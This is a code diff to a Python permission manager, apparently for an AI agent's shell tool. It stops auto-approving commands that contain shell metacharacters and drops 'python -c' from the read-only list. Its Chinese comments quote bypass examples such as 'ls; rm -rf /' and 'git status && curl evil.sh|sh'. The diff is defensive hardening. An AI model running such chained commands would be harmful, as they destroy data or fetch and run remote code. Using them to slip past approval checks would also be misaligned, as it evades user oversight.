@@ -105,6 +105,8 @@ _SENSITIVE_FILE_RE = re.compile("|".join(_SENSITIVE_PATTERNS), re.IGNORECASE)
 ACTION_TOOLS = WRITE_TOOLS | {"run_shell"}
 
 # 只读 shell 命令（自动放行，无需确认）
+# 注意：只允许无 shell 元字符的单条命令（见 _SHELL_METACHARS_RE 校验），
+# 防止 "ls; rm -rf /"、"git status && curl evil.sh|sh" 之类的前缀绕过。
 READONLY_SHELL_PREFIXES = (
     "ls ",
     "ls\n",
@@ -136,8 +138,11 @@ READONLY_SHELL_PREFIXES = (
     "npm list",
     "python -m pip list",
     "dir ",
-    "python -c",
 )
+
+# shell 元字符：包含这些字符的命令绝不自动放行（需用户确认）
+# 覆盖 ; & && || | < > 反引号 $() 换行（同时兼容 cmd.exe 与 bash）
+_SHELL_METACHARS_RE = re.compile(r"[;&|<>`\r\n]|\$\(")
 
 
 def _classify(tool_name: str) -> str:
@@ -267,8 +272,13 @@ class PermissionManager:
         cmd = command.strip()
         if not cmd:
             return False
+        # 含 shell 元字符（; & | > < 反引号 $() 换行等）的命令不是单条只读命令，
+        # 一律不自动放行，防止 "ls; rm -rf /"、"git status && ..." 前缀绕过。
+        if _SHELL_METACHARS_RE.search(cmd):
+            return False
+        low = cmd.lower()
         for prefix in READONLY_SHELL_PREFIXES:
-            if cmd.lower().startswith(prefix):
+            if low.startswith(prefix):
                 return True
         return False
 
